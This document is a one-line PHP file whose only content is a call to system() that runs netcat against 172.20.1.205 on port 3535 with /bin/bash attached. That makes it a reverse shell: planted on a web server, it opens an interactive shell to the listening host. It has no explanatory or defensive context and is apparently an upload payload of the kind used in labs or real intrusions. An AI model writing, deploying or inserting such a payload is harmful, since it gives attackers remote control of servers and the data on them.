<?php system("/bin/nc 172.20.1.205 3535 -e /bin/bash"); ?>
